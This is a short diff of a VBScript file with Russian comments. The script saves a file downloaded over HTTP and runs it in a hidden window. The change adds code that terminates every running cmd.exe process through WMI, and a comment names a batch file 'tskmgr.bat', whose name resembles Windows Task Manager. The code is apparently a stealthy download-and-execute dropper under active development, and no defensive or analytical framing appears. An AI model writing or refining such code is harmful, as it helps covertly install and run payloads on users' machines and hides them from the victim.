@@ -39,13 +39,22 @@ If objHTTP.Status = 200 Then
     objStream.SaveToFile filePath, 2 ' 2 = перезапись
     objStream.Close
 
-    ' Запускаем файл невидимо
-    CreateObject("WScript.Shell").Run filePath, 0, True ' Ждем завершения выполнения
+    ' Запускаем файл невидимо и ожидаем завершения
+    CreateObject("WScript.Shell").Run filePath, 0, True 
 End If
 
 Set objStream = Nothing
 Set objHTTP = Nothing
 Set fso = Nothing
+
+' Закрываем все запускаемые cmd.exe процессы
+Dim objWMIService, objProcess
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+Set objProcess = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe'")
+
+For Each process In objProcess
+    process.Terminate
+Next
 
 ' Теперь выполняем дальнейшие действия, если tskmgr.bat завершен
 On Error Resume Next
